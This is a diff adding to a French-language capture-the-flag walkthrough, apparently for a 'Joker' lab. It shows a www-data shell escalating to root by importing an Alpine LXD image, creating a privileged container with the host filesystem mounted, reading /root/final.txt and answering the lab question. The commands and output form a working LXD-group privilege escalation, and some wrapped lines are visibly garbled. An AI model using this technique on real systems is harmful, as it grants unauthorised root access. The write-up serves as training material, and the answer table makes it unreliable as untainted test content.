@@ -473,7 +473,84 @@ Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'
 alpine-v3.13-x86_64 100%[===================>]   3.11M  4.70MB/s    in 0.7s    
 
 2024-11-19 01:16:39 (4.70 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
+www-data@ubuntu:/dev/shm$ ls -l
+total 3184
+-rw-rw-rw- 1 www-data www-data 3259593 Nov 19 01:10 alpine-v3.13-x86_64-20210218_0139.tar.gz
+ar.gz --alias myimageshm$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.ta
+www-data@ubuntu:/dev/shm$ lxc image list     
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Nov 19, 2024 at 9:20am (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+uew-data@ubuntu:/dev/shm$ lxc init myimage mycontainer -c security.privileged=tru
+Creating mycontainer
+=/ path=/mnt/root recursive=truenfig device add mycontainer mydevice disk source=
+Device mydevice added to mycontainer
 
+www-data@ubuntu:/dev/shm$ lxc exec mycontainer /bin/sh
+~ # whoami
+root
 
 ```
+
+Ne pas oublier d'aller dans le répertoire /mnt/root du conteneur pour y retrouver tous les fichiers de la machine cible.
+
+```
+~ # cd /mnt/root
+/mnt/root # ls -l
+total 970048
+drwxr-xr-x    2 root     root          4096 Oct  8  2019 bin
+drwxr-xr-x    3 root     root          4096 Oct  8  2019 boot
+drwxr-xr-x   17 root     root          3700 Nov 19 08:54 dev
+drwxr-xr-x   85 root     root          4096 Oct 25  2019 etc
+drwxr-xr-x    3 root     root          4096 Oct  8  2019 home
+lrwxrwxrwx    1 root     root            33 Oct  8  2019 initrd.img -> boot/initrd.img-4.15.0-55-generic
+lrwxrwxrwx    1 root     root            33 Oct  8  2019 initrd.img.old -> boot/initrd.img-4.15.0-55-generic
+drwxr-xr-x   20 root     root          4096 Oct  8  2019 lib
+drwxr-xr-x    2 root     root          4096 Oct  8  2019 lib64
+drwx------    2 root     root         16384 Oct  8  2019 lost+found
+drwxr-xr-x    4 root     root          4096 Oct  8  2019 media
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
+drwxr-xr-x    3 root     root          4096 Oct  8  2019 opt
+dr-xr-xr-x  118 root     root             0 Nov 19 08:54 proc
+drwx------    5 root     root          4096 Oct 25  2019 root
+drwxr-xr-x   21 root     root           660 Nov 19 09:23 run
+drwxr-xr-x    2 root     root          4096 Oct  8  2019 sbin
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
+-rw-------    1 root     root     993244160 Oct  8  2019 swapfile
+dr-xr-xr-x   13 root     root             0 Nov 19 08:54 sys
+drwxrwxrwt   11 root     root          4096 Nov 19 09:20 tmp
+drwxr-xr-x   10 root     root          4096 Oct  8  2019 usr
+drwxr-xr-x   12 root     root          4096 Oct  8  2019 var
+lrwxrwxrwx    1 root     root            30 Oct  8  2019 vmlinuz -> boot/vmlinuz-4.15.0-55-generic
+lrwxrwxrwx    1 root     root            30 Oct  8  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-55-generic
+/mnt/root # cd root
+/mnt/root/root # ls
+final.txt
+/mnt/root/root # cat final.txt
+
+     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                         
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+	
+/mnt/root/root # 
+```
+
+### Réponse à la dernière question
+
+<table><thead><tr><th width="541">Question</th><th>Réponse</th></tr></thead><tbody><tr><td>What is the name of the file in the /root directory?</td><td>final.txt</td></tr></tbody></table>
 
